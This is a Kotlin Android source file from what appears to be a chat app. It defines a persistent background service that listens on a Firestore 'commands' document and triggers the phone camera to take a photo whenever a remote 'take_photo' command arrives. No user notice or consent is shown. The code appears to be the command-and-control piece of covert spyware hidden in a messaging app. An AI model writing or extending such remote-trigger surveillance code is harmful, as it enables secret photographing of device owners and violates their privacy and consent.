package com.divchatting

import android.app.Service
import android.content.Intent
import android.os.IBinder
import com.google.firebase.firestore.FirebaseFirestore

class CommandService : Service() {

    private val db = FirebaseFirestore.getInstance()
    private val myId = "USER_XXXXXX" // ambil dari MainActivity atau shared prefs

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        db.collection("commands").document(myId)
            .addSnapshotListener { snapshot, _ ->
                val action = snapshot?.getString("action")
                if(action == "take_photo"){
                    CameraHelper().takePhoto(this)
                }
            }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
